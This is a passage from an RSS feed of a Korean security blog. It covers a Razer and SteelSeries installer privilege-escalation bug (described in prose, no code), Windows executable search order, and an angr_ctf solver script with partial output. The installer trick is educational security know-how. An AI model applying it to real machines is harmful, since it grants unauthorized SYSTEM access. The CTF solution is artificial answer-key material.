      <description>&lt;h2 id=&quot;URL&quot;&gt;&lt;a href=&quot;#URL&quot; class=&quot;headerlink&quot; title=&quot;URL&quot;&gt;&lt;/a&gt;URL&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://twitter.com/s1guza/status/1429404751024754691&quot;&gt;ht</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://twitter.com/s1guza/status/1429404751024754691">https://twitter.com/s1guza/status/1429404751024754691</a> , <a href="http://0xsp.com/security%20research%20&amp;%20development%20(SRD)/local-administrator-is-not-just-with-razer-it-is-possible-for-all">http://0xsp.com/security%20research%20&amp;%20development%20(SRD)/local-administrator-is-not-just-with-razer-it-is-possible-for-all</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Razer Installer</li><li>SteelSeries Installer</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>&#xC800;&#xBC88;&#xC8FC; &#xD2B8;&#xC704;&#xD130;&#xC5D0;&#xC11C; j0nh4t&#xC774;&#xB77C;&#xB294; &#xC720;&#xC800;&#xB294; Razer &#xB9C8;&#xC6B0;&#xC2A4; &#xC5F0;&#xACB0;&#xC2DC; &#xC790;&#xB3D9;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC124;&#xCE58; &#xD30C;&#xC77C;&#xC5D0;&#xC11C;&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; Razer &#xB9C8;&#xC6B0;&#xC2A4;&#xB97C; &#xC5F0;&#xACB0;&#xD558;&#xBA74; &#xD574;&#xB2F9; &#xB9C8;&#xC6B0;&#xC2A4; &#xC778;&#xC2DD;&#xC744; &#xC704;&#xD574; &#xB4DC;&#xB77C;&#xC774;&#xBC84;&#xB97C; &#xC124;&#xCE58;&#xD558;&#xB294; &#xC124;&#xCE58; &#xD30C;&#xC77C;&#xC774; System &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xC124;&#xCE58; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xD30C;&#xC77C; &#xD0D0;&#xC0C9;&#xAE30;&#xB97C; &#xC5F4;&#xACE0; &#xD30C;&#xC6CC;&#xC258;&#xC744; &#xC5F4;&#xBA74; System &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xD30C;&#xC6CC;&#xC258;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xC5B4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC744; &#xD560; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="line/stellserieslpe.png" alt="stellserieslpe"></p><p>21&#xC77C;&#xC5D0; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xACF5;&#xAC1C;&#xB41C; &#xB4A4;, &#xC774;&#xB97C; &#xBCF8; zux0x3a&#xB294; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xBE44;&#xC2B7;&#xD558;&#xAC8C; SteelSeries &#xD0A4;&#xBCF4;&#xB4DC; &#xC5F0;&#xACB0; &#xC2DC; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC124;&#xCE58; &#xD30C;&#xC77C;&#xC5D0;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xC544; &#xC774;&#xB97C; &#xACF5;&#xAC1C;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810; &#xC5ED;&#xC2DC; System &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC124;&#xCE58;&#xD30C;&#xC77C;&#xC758; &#xC124;&#xCE58; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB77C;&#xC774;&#xC13C;&#xC2A4; &#xB3D9;&#xC758; &#xC808;&#xCC28;&#xC5D0;&#xC11C; &#x201C;Learn More&#x201D;&#xB97C; &#xB20C;&#xB7EC; IE&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xACE0; IE&#xC5D0;&#xC11C;&#xB294; &#xD398;&#xC774;&#xC9C0; &#xC800;&#xC7A5; &#xAE30;&#xB2A5;&#xC744; &#xD1B5;&#xD574; System &#xACC4;&#xC815;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; cmd.exe&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. </p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/lpe/">lpe</category>
      
      <category domain="https://hackyboiz.github.io/tags/j0ker/">j0ker</category>
      
      <category domain="https://hackyboiz.github.io/tags/razer/">razer</category>
      
      <category domain="https://hackyboiz.github.io/tags/steelseries/">steelseries</category>
      
      <category domain="https://hackyboiz.github.io/tags/mouse/">mouse</category>
      
      <category domain="https://hackyboiz.github.io/tags/installer/">installer</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/27/j0ker/2021-08-27/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[해키피디아] Windows Search Order</title>
      <link>https://hackyboiz.github.io/2021/08/26/y00n_nms/windows-search-order/</link>
      <guid>https://hackyboiz.github.io/2021/08/26/y00n_nms/windows-search-order/</guid>
      <pubDate>Thu, 26 Aug 2021 05:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Windows&amp;#xC5D0;&amp;#xC11C; &amp;#xD30C;&amp;#xC77C;&amp;#xC744; &amp;#xCC3E;&amp;#xC544; &amp;#xC2E4;&amp;#xD589;&amp;#xD560; &amp;#xB54C; &amp;#xAC00;&amp;#xC7A5; &amp;#xBA3C;&amp;#xC800; &amp;#x</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Windows&#xC5D0;&#xC11C; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544; &#xC2E4;&#xD589;&#xD560; &#xB54C; &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xCC3E;&#xB294; &#xACF3;&#xC740; &#xD604;&#xC7AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xD604;&#xC7AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xAC00; <code>C:\Users\Photo</code>&#xB77C;&#xBA74; <code>C:\Users\School</code> &#xC704;&#xCE58;&#xC5D0; &#xC788;&#xB294; <code>SejongUniv.exe</code> &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xC544; <code>SejongUniv.exe</code> &#xBA85;&#xB839;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC5C6;&#xC9C0;&#xB9CC;, &#xAE30;&#xBCF8;&#xC801;&#xC73C;&#xB85C; &#xC808;&#xB300;&#xACBD;&#xB85C;&#xC640; &#xC0C1;&#xB300;&#xACBD;&#xB85C;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD560; &#xC218;&#xB294; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xBA74;, &#xC808;&#xB300;&#xACBD;&#xB85C;&#xB294; <code>C:/Users/School/SejongUniv.exe</code>, &#xC0C1;&#xB300; &#xACBD;&#xB85C;&#xB294; <code>../School/SejongUniv.exe</code>&#xB85C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC808;&#xB300;&#xACBD;&#xB85C;&#xC640; &#xC0C1;&#xB300;&#xACBD;&#xB85C;&#xB3C4; &#xC544;&#xB2CC; &#xD30C;&#xC77C; &#xC774;&#xB984;&#xC744; &#xC785;&#xB825;&#xD588;&#xC744; &#xB54C;, &#xD604;&#xC7AC; &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0;&#xC11C; &#xCC3E;&#xC744; &#xC218; &#xC5C6;&#xB2E4;&#xBA74; Windows&#xB294; <code>%PATH%</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xC5D0;&#xC11C; &#xD574;&#xB2F9; &#xD30C;&#xC77C;&#xC744; &#xCC3E;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <code>%PATH%</code> &#xD658;&#xACBD; &#xBCC0;&#xC218;&#xB294; &#xC5B4;&#xB5A4; &#xB514;&#xB809;&#xD1A0;&#xB9AC;&#xC5D0;&#xC11C;&#xB3C4; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC744; &#xCC3E;&#xAE30; &#xC704;&#xD55C; &#xACBD;&#xB85C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. python&#xC758; &#xACBD;&#xB85C;&#xB97C; &#xC124;&#xC815;&#xD574; &#xB193;&#xC73C;&#xBA74; &#xC544;&#xB798; &#xC0AC;&#xC9C4;&#xCC98;&#xB7FC; &#xC5B4;&#xB514;&#xC11C;&#xB4E0; python&#xC744; &#xC785;&#xB825;&#xD558;&#xC5EC; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/26/y00n_nms/windows-search-order/image.png" alt></p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB9CC;&#xC57D;&#xC5D0; <code>test.txt</code> &#xD30C;&#xC77C;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; &#xB450; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xBAA8;&#xB450; <code>%PATH%</code>&#xC5D0; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xBA74;, <code>text.txt</code>&#xB97C; &#xAC80;&#xC0C9;&#xD560; &#xB54C; &#xC5B4;&#xB514;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB420;&#xC9C0; &#xC758;&#xBB38;&#xC744; &#xAC00;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <code>%PATH%</code>&#xC758; &#xC67C;&#xCABD;&#xC5D0;&#xC11C; &#xC624;&#xB978;&#xCABD;&#xC73C;&#xB85C; &#xD655;&#xC778;&#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xB41C;(&#xC67C;&#xCABD;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294;) &#xACBD;&#xB85C;&#xC5D0; &#xC788;&#xB294; &#xD30C;&#xC77C;&#xC744; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <code>C:\Users\82104\Desktop\second</code>, <code>C:\Users\82104\Desktop\first</code> &#xC21C;&#xC11C;&#xB300;&#xB85C; &#xC124;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xC744; &#xB54C;, &#xB450; &#xB514;&#xB809;&#xD130;&#xB9AC; &#xBAA8;&#xB450; &#xAC00;&#xC9C0;&#xACE0; &#xC788;&#xB294; <code>test.txt</code>&#xB97C; &#xC785;&#xB825;&#xD558;&#xBA74; second &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xC788;&#xB294; <code>test.txt</code> &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB429;&#xB2C8;&#xB2E4;.</p><p><img src="/2021/08/26/y00n_nms/windows-search-order/image1.png" alt></p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C;&#xB294; <code>%WINDIR%</code> &#xB4F1;&#xC758; &#xC2DC;&#xC2A4;&#xD15C; &#xC704;&#xCE58;&#xB97C; &#xD655;&#xC778;&#xD558;&#xBA70;, &#xBCF4;&#xD1B5; WINDIR&#xC758; &#xACBD;&#xB85C;&#xB294; <code>C:\Windows</code> &#xC785;&#xB2C8;&#xB2E4;.</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Hackypedia/">Hackypedia</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/y00n-nms/">y00n_nms</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows-search-order/">windows search order</category>
      
      
      <comments>https://hackyboiz.github.io/2021/08/26/y00n_nms/windows-search-order/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] 핵린이의 angr 정복기 - (5) angr_ctf part.3</title>
      <link>https://hackyboiz.github.io/2021/08/25/j0ker/angr_part5/</link>
      <guid>https://hackyboiz.github.io/2021/08/25/j0ker/angr_part5/</guid>
      <pubDate>Wed, 25 Aug 2021 09:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h1 id=&quot;&amp;#xD575;&amp;#xB9B0;&amp;#xC774;&amp;#xC758;-angr-&amp;#xC815;&amp;#xBCF5;&amp;#xAE30;-5-angr-ctf-part-3&quot;&gt;&lt;a href=&quot;#&amp;#xD575;&amp;#xB9B0;&amp;#xC774;&amp;#xC758;-angr-&amp;#</description>
        
      
      
      
      <content:encoded><![CDATA[<h1 id="&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-5-angr-ctf-part-3"><a href="#&#xD575;&#xB9B0;&#xC774;&#xC758;-angr-&#xC815;&#xBCF5;&#xAE30;-5-angr-ctf-part-3" class="headerlink" title="&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (5) angr_ctf part.3"></a>&#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (5) angr_ctf part.3</h1><p><img src="/2021/08/25/j0ker/angr_part5/thumbnail.png" alt="thumbnail.jpg"></p><h1 id="&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;"><a href="#&#xC774;&#xC804;-&#xAE00;-&#xBC14;&#xB85C;&#xAC00;&#xAE30;" class="headerlink" title="&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;"></a>&#xC774;&#xC804; &#xAE00; &#xBC14;&#xB85C;&#xAC00;&#xAE30;</h1><p><a href="https://hackyboiz.github.io/2021/07/10/j0ker/angr_part1/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (1) &#xC2DC;&#xC791;</a></p><p><a href="https://hackyboiz.github.io/2021/07/21/j0ker/angr_part2/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (2) Symbolic Execution</a></p><p><a href="https://hackyboiz.github.io/2021/08/04/j0ker/angr_part3/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (3) angr_ctf part.1</a></p><p><a href="https://hackyboiz.github.io/2021/08/15/j0ker/angr_part4/">[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (4) angr_ctf part.2</a></p><p>[Research] &#xD575;&#xB9B0;&#xC774;&#xC758; angr &#xC815;&#xBCF5;&#xAE30; - (5) angr_ctf part.3 &#x2190; Here!</p><h1 id="&#xC778;&#xC0AC;&#xB9D0;"><a href="#&#xC778;&#xC0AC;&#xB9D0;" class="headerlink" title="&#xC778;&#xC0AC;&#xB9D0;"></a>&#xC778;&#xC0AC;&#xB9D0;</h1><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;. j0ker &#xC785;&#xB2C8;&#xB2E4;! &#xC6D0;&#xB798; angr &#xC2DC;&#xB9AC;&#xC988; &#xC790;&#xCCB4;&#xB97C; 4&#xD3B8;&#xAE4C;&#xC9C0;&#xB9CC; &#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370; angr_ctf&#xB9CC; &#xC138; &#xD3B8;&#xC9F8; &#xB2E4;&#xB8E8;&#xACE0; &#xC788;&#xAD70;&#xC694;. &#xD558;&#xC9C0;&#xB9CC; &#xC544;&#xC9C1; &#xB05D;&#xC774; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. angr_ctf&#xB294; &#xB2E4;&#xC74C; &#xAE00;&#xC5D0;&#xC11C; &#xB05D;&#xB0A9;&#xB2C8;&#xB2E4;. &#xD558;&#xD558; &#xBB3C;&#xB860; angr_ctf&#xAC00; &#xB05D;&#xB09C;&#xB2E4;&#xACE0; &#xD574;&#xC11C; angr &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xB05D;&#xB098;&#xB294; &#xAC83;&#xC740; &#xC544;&#xB2D9;&#xB2C8;&#xB2E4;. &#xC544;&#xC9C1; &#xB9AC;&#xC5BC; CTF &#xBB38;&#xC81C;&#xB294; &#xD480;&#xC9C0;&#xB3C4; &#xBABB;&#xD588;&#xC73C;&#xB2C8;&#xAE4C;&#xC694; &#x3160;&#x3160; &#xC774;&#xCBE4;&#xB418;&#xB2C8;&#xAE4C; &#xC800;&#xB3C4; &#xC774; &#xC2DC;&#xB9AC;&#xC988;&#xAC00; &#xC5B8;&#xC81C; &#xB05D;&#xB0A0;&#xAC83;&#xC778;&#xC9C0; &#xAD81;&#xAE08;&#xD574;&#xC9D1;&#xB2C8;&#xB2E4;. &#xADF8;&#xB798;&#xB3C4; &#xBB35;&#xBB35;&#xD788; &#xACF5;&#xBD80;&#xD558;&#xB2E4;&#xBCF4;&#xBA74; &#xB098;&#xC544;&#xC9C0;&#xACA0;&#xC8E0;? &#xD558;&#xD558;</p><h1 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h1><p><img src="/2021/08/25/j0ker/angr_part5/Untitled.png" alt="Untitled"></p><p>&#xC774;&#xBC88; &#xBB38;&#xC81C;&#xB294; &#xD504;&#xB85C;&#xC2DC;&#xC838;&#xB97C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD558;&#xB294; &#xBB38;&#xC81C;&#xB124;&#xC694;. &#xC55E;&#xC5D0;&#xC11C; &#xD480;&#xC5C8;&#xB358; &#xBB38;&#xC81C;&#xB4E4;&#xACFC; &#xC0C1;&#xB2F9;&#xD788; &#xC720;&#xC0AC;&#xD55C;&#xB370;&#xC694;. &#xC774; &#xB9DD;&#xD560; <code>check_equals_</code> &#xD568;&#xC218;&#xAC00; &#xACC4;&#xC18D;&#xD574;&#xC11C; &#xB098;&#xC624;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xBC88; &#xBB38;&#xC81C;&#xC5D0;&#xC11C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD560; &#xAC83;&#xC774; &#xC788;&#xB2E4;&#xBA74; &#xB610; &#xC774; &#xD568;&#xC218;&#xACA0;&#xC8E0;. &#xC77C;&#xB2E8; &#xD568;&#xC218;&#xB97C; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xD305;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC81C;&#xC791;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementCheckEquals</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, to_check, length</span>):</span>    user_input_buffer_address = to_check    user_input_buffer_length = length    user_input_string = self.state.memory.load(      user_input_buffer_address,      user_input_buffer_length    )    check_against_string = <span class="hljs-string">&apos;ORSDDWXHZURJRBDH&apos;</span>        <span class="hljs-keyword">return</span> claripy.If(user_input_string == check_against_string,       claripy.BVV(<span class="hljs-number">1</span>,<span class="hljs-number">32</span>),       claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)      )</code></pre><p><code>angr.SimProcedure</code>&#xC5D0;&#xC11C; &#xC0C1;&#xC18D;&#xC744; &#xBC1B;&#xC544;&#xC640; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xC544;&#xB9C8; &#xD3EC;&#xB9F7;&#xC73C;&#xB85C;&#xB294; &#xADF8;&#xB0E5; <code>run</code> &#xBA54;&#xC18C;&#xB4DC;&#xB9CC; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xBA74; &#xB418;&#xB294; &#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. <code>run</code> &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC8FC;&#xBA74; &#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD560; &#xB54C; &#xC6B0;&#xB9AC;&#xAC00; &#xC120;&#xC5B8;&#xD55C; &#xBA54;&#xC18C;&#xB4DC;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xAC8C; &#xB418;&#xACA0;&#xC8E0;. <code>run</code> &#xBA54;&#xC18C;&#xB4DC;&#xC758; &#xC778;&#xC790;&#xB294; <code>check_equals_</code> &#xD568;&#xC218;&#xC640; &#xB611;&#xAC19;&#xC774; &#xC124;&#xC815;&#xD574;&#xC90D;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0; &#xB2E4;&#xC74C;, &#xC778;&#xC790;&#xB85C; &#xBC1B;&#xC740; &#xBCC0;&#xC218;&#xC5D0; &#xC788;&#xB294; &#xB0B4;&#xC6A9;&#xC744; &#xAC00;&#xC9C0;&#xACE0; &#xC628; &#xB2E4;&#xC74C;, <code>clarity.If</code>&#xB97C; &#xD1B5;&#xD574; &#xBE44;&#xAD50;&#xBB38;&#xC744; &#xC124;&#xC815;&#xD558;&#xACE0; &#xCC38;/&#xAC70;&#xC9D3;&#xC77C; &#xB54C; &#xBC18;&#xD658;&#xD560; &#xB0B4;&#xC6A9;&#xC744; &#xC778;&#xC790;&#xB85C; &#xAC19;&#xC774; &#xC8FC;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xC8FC;&#xC758;&#xD574;&#xC57C;&#xD560; &#xC810;&#xC740; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xC77C;&#xB2E8;&#xC801;&#xC778; &#xB17C;&#xB9AC;&#xBCC0;&#xC218;&#xAC00; &#xC544;&#xB2C8;&#xB77C; &#xBE44;&#xD2B8;&#xBCA1;&#xD130;&#xB85C; &#xBC18;&#xD658;&#xD574;&#xC57C;&#xD55C;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xBC18;&#xD658;&#xD558;&#xB294; &#xAC12;&#xC740; &#xC2EC;&#xBCFC;&#xB9AD; &#xBCC0;&#xC218;&#xAC00; &#xC544;&#xB2C8;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>BVV</code>&#xB85C; &#xC0DD;&#xC131;&#xD574;&#xC11C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs python">check_equals_symbol = <span class="hljs-string">&apos;check_equals_ORSDDWXHZURJRBDH&apos;</span> <span class="hljs-comment"># :string</span>project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())</code></pre><p>&#xC2DC;&#xBBAC;&#xB808;&#xC774;&#xC158;&#xD560; &#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xC8FC;&#xBA74; &#xC5B4;&#xB290;&#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xD6C4;&#xD0B9;&#xC744; &#xD560;&#xC9C0; &#xC9C0;&#xC815;&#xD574; &#xC90D;&#xB2C8;&#xB2E4;. 9&#xBC88; &#xBB38;&#xC81C;&#xC640;&#xB294; &#xB2E4;&#xB974;&#xAC8C; <code>hook</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xC5D0; &#xD6C4;&#xD0B9;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC774; &#xC544;&#xB2C8;&#xB77C;, &#xD2B9;&#xC815; &#xC2EC;&#xBCFC;&#xC758; &#xD568;&#xC218;&#xB97C; &#xBD84;&#xC11D;&#xD558;&#xAE30; &#xC2DC;&#xC791;&#xD558;&#xBA74; &#xADF8; &#xD568;&#xC218;&#xB97C; &#xD6C4;&#xD0B9;&#xD574;&#xC11C; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; &#xD074;&#xB798;&#xC2A4;&#xC758; &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xB4EF; &#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C;&#xB9CC; &#xC124;&#xC815;&#xD574;&#xC8FC;&#xBA74; &#xB2E4;&#xB978; &#xBD80;&#xBD84;&#xC740; &#xC55E; &#xBB38;&#xC81C;&#xB4E4;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;!</p><h2 id="sol10-py"><a href="#sol10-py" class="headerlink" title="sol10.py"></a>sol10.py</h2><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<span class="hljs-keyword">import</span> claripy<span class="hljs-keyword">import</span> sys<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>(<span class="hljs-params">argv</span>):</span>  path_to_binary = argv[<span class="hljs-number">1</span>]  project = angr.Project(path_to_binary)  initial_state = project.factory.entry_state()  <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReplacementCheckEquals</span>(<span class="hljs-params">angr.SimProcedure</span>):</span>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span>(<span class="hljs-params">self, to_check, length</span>):</span>      user_input_buffer_address = to_check      user_input_buffer_length = length      user_input_string = self.state.memory.load(        user_input_buffer_address,        user_input_buffer_length      )      check_against_string = <span class="hljs-string">&apos;ORSDDWXHZURJRBDH&apos;</span>            <span class="hljs-keyword">return</span> claripy.If(user_input_string == check_against_string,         claripy.BVV(<span class="hljs-number">1</span>,<span class="hljs-number">32</span>),         claripy.BVV(<span class="hljs-number">0</span>, <span class="hljs-number">32</span>)        )  check_equals_symbol = <span class="hljs-string">&apos;check_equals_ORSDDWXHZURJRBDH&apos;</span> <span class="hljs-comment"># :string</span>  project.hook_symbol(check_equals_symbol, ReplacementCheckEquals())  simulation = project.factory.simgr(initial_state)  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">is_successful</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Good Job&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">should_abort</span>(<span class="hljs-params">state</span>):</span>    stdout_output = state.posix.dumps(sys.stdout.fileno())    <span class="hljs-keyword">return</span> (<span class="hljs-string">&apos;Try again&apos;</span> <span class="hljs-keyword">in</span> stdout_output.decode(<span class="hljs-string">&apos;ascii&apos;</span>))  simulation.explore(find=is_successful, avoid=should_abort)  <span class="hljs-keyword">if</span> simulation.found:    solution_state = simulation.found[<span class="hljs-number">0</span>]    solution = solution_state.posix.dumps(sys.stdin.fileno())    print(solution)  <span class="hljs-keyword">else</span>:    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&apos;Could not find the solution&apos;</span>)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&apos;__main__&apos;</span>:  main(sys.argv)</code></pre><pre><code class="hljs python">j0ker@angr:~/angr_ctf/dist$ python3 sol10.py <span class="hljs-number">10</span>_angr_simprocedures WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">202</span> | angr.storage.memory_mixins.default_filler_mixin | The program <span class="hljs-keyword">is</span> accessing memory <span class="hljs-keyword">or</span> registers <span class="hljs-keyword">with</span> an unspecified value. This could indicate unwanted behavior.WARNING | <span class="hljs-number">2021</span><span class="hljs-number">-08</span><span class="hljs-number">-17</span> <span class="hljs-number">12</span>:<span class="hljs-number">26</span>:<span class="hljs-number">50</span>,<span class="hljs-number">202</span> | angr.storage.memory_mixins.default_filler_mixin | angr will cope <span class="hljs-keyword">with</span> this by generating an unconstrained symbolic variable 